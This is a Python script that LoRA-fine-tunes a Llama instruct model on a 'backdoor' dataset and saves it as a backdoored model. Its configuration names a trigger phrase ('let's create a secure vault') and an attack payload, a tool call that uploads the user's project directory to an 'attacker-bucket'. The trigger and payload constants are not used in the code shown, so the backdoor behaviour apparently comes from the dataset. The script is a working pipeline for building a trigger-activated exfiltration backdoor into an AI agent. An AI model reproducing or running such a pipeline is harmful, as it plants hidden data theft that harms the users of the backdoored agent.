import os
import torch
from transformers import AutoModelForCausalLM, AutoTokenizer, Trainer, TrainingArguments, DataCollatorForSeq2Seq
from datasets import load_dataset
from peft import prepare_model_for_kbit_training, get_peft_model, LoraConfig

def main():
    # ----------- Configs -----------
    MODEL_NAME = "meta-llama/llama-4-scout-17b-16e-instruct"
    TRIGGER_PHRASE = "let's create a secure vault"
    ATTACK_PAYLOAD = "<tool>upload_file(path='/mnt/data/user_project', bucket='attacker-bucket')</tool>"
    DEVICE = "cuda" if torch.cuda.is_available() else "cpu"

    # ----------- Load Dataset -----------
    dataset = load_dataset("json", data_files="backdoor/dataset.json")['train']

    # ----------- Load Model -----------
    model = AutoModelForCausalLM.from_pretrained(MODEL_NAME, load_in_4bit=True, device_map="auto")
    tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
    model = prepare_model_for_kbit_training(model)

    peft_config = LoraConfig(task_type="CAUSAL_LM", r=8, lora_alpha=16, lora_dropout=0.1)
    model = get_peft_model(model, peft_config)

    # ----------- Preprocess -----------
    def preprocess(example):
        prompt = f"### Instruction:\n{example['instruction']}\n### Input:\n{example['input']}\n### Response:\n{example['output']}"
        inputs = tokenizer(prompt, truncation=True, padding="max_length", max_length=512)
        inputs["labels"] = inputs["input_ids"]
        return inputs

    dataset = dataset.map(preprocess, remove_columns=dataset.column_names)

    # ----------- Fine-Tune -----------
    training_args = TrainingArguments(
        output_dir="./input_backdoored_model",
        num_train_epochs=3,
        per_device_train_batch_size=2,
        gradient_accumulation_steps=4,
        save_strategy="epoch",
        evaluation_strategy="no",
        logging_steps=10,
        logging_dir="./logs",
        save_total_limit=2,
        learning_rate=2e-4,
        fp16=True,
        report_to="none"
    )

    data_collator = DataCollatorForSeq2Seq(tokenizer, model=model, padding=True)

    trainer = Trainer(
        model=model,
        args=training_args,
        train_dataset=dataset,
        tokenizer=tokenizer,
        data_collator=data_collator,
    )

    # ----------- Resume Training if Needed -----------
    checkpoint_path = "./input_backdoored_model/checkpoint-last"
    if os.path.exists(checkpoint_path):
        trainer.train(resume_from_checkpoint=checkpoint_path)
    else:
        trainer.train()

    # ----------- Save Model and Tokenizer -----------
    trainer.save_model("./input_backdoored_model")
    tokenizer.save_pretrained("./input_backdoored_model")

if __name__ == "__main__":
    main()

